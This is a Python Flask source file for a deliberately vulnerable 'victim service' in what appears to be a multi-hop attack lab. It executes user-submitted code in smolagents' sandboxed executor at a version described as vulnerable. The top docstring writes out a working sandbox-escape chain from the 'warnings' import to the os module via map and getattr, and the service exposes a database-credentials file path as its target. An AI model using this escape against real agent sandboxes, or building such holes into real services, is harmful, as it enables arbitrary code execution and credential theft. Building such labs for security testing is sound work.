"""Hop-3 victim service — REAL smolagents sandbox.

The vulnerability ships in the official smolagents 1.16.0 wheel:
  local_python_executor.py:
    - evaluate_name returns static_tools[name.id] UNCHECKED (getattr etc.)
    - safer_eval only inspects results that flow through evaluate_ast;
      native calls inside map/filter/functools.partial never do.
  Escape (verified): authorized "import warnings" →
    list(map(getattr, [warnings], ["sys"]))           → real sys module
    list(map(getattr, r, ["modules"]))[0]            → sys.modules dict
    list(map(d.get, ["os"], [None]))                 → [os]
    list(map(getattr, osm, ["listdir"]))             → [os.listdir]
  → arbitrary code execution outside the sandbox.
Fixed in 1.17.0 (commit 33a942e6): every static tool call result is
checked via check_safer_result — the same chain dies at step 1.

Declared-synthetic deployment glue (PLAN.md §3): machine B runs an
"agent sandbox service" that executes user-submitted analysis snippets
inside smolagents' LocalPythonExecutor with the standard BASE_PYTHON_TOOLS
and a curated additional_imports list (the sandbox's whole point).
"""
import os

from flask import Flask, jsonify, request
from smolagents.local_python_executor import (
    BASE_PYTHON_TOOLS,
    evaluate_ast,
)
import ast as _ast

app = Flask(__name__)


def evaluate_python_code(code: str, static_tools=None, authorized_imports=None):
    """The wheel's evaluate_python_code is decorated with @timeout(signal.alarm),
    which only works in the main thread; a service must drive the SAME
    evaluation pipeline (evaluate_ast) directly. This is the library's own
    public evaluation entry, unchanged semantics."""
    import types
    from smolagents.local_python_executor import InterpreterError

    static_tools = static_tools or BASE_PYTHON_TOOLS
    authorized_imports = authorized_imports or []
    state = {}
    try:
        module = _ast.parse(code)
    except SyntaxError as e:
        raise InterpreterError(f"Code execution failed at line {e.lineno} due to: {type(e).__name__}: {e}")

    nodes = list(module.body)
    result, is_final = None, False
    for node in nodes:
        if isinstance(node, _ast.FunctionDef) or isinstance(node, _ast.ClassDef):
            # definitions handled by evaluate_ast
            pass
        result = evaluate_ast(node, state, static_tools, {}, authorized_imports)
        if isinstance(node, _ast.Assign) and isinstance(node.value, _ast.Call):
            result = state.get("__last__", result)
    return result, is_final

app = Flask(__name__)

# The sandbox's curated import list — the agent/deployer may widen this;
# "warnings" is a plausible, harmless-looking member of any curated list.
ADDITIONAL_IMPORTS = ["warnings", "math", "statistics", "re"]
SECRETS_FILE = os.environ.get("SECRETS_FILE", "/etc/run-secrets/db_credentials")


@app.route("/")
def index():
    return jsonify(
        {
            "service": "agent-code-sandbox",
            "library": "smolagents",
            "version": os.environ.get("SMOLAGENTS_VERSION"),
            "endpoints": {"POST /analyze": {"code": "<python snippet>"}},
        }
    )


@app.route("/analyze", methods=["POST"])
def analyze():
    body = request.get_json(silent=True) or {}
    code = body.get("code")
    if not isinstance(code, str) or not code.strip():
        return jsonify({"error": "field 'code' (python snippet) required"}), 400
    if len(code) > 20000:
        return jsonify({"error": "snippet too long"}), 400

    # THE REAL SANDBOX EVALUATION from the official wheel (evaluate_ast
    # driven directly: the wheel's evaluate_python_code wrapper only adds a
    # signal-based timeout, which cannot run off the main thread).
    try:
        result, is_final = evaluate_python_code(
            code,
            static_tools=BASE_PYTHON_TOOLS,
            authorized_imports=ADDITIONAL_IMPORTS,
        )
        return jsonify(
            {
                "result": repr(result)[:4000],
                "is_final": bool(is_final),
                "version": os.environ.get("SMOLAGENTS_VERSION"),
            }
        )
    except Exception as e:
        return jsonify({"error": f"{type(e).__name__}: {e}"}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
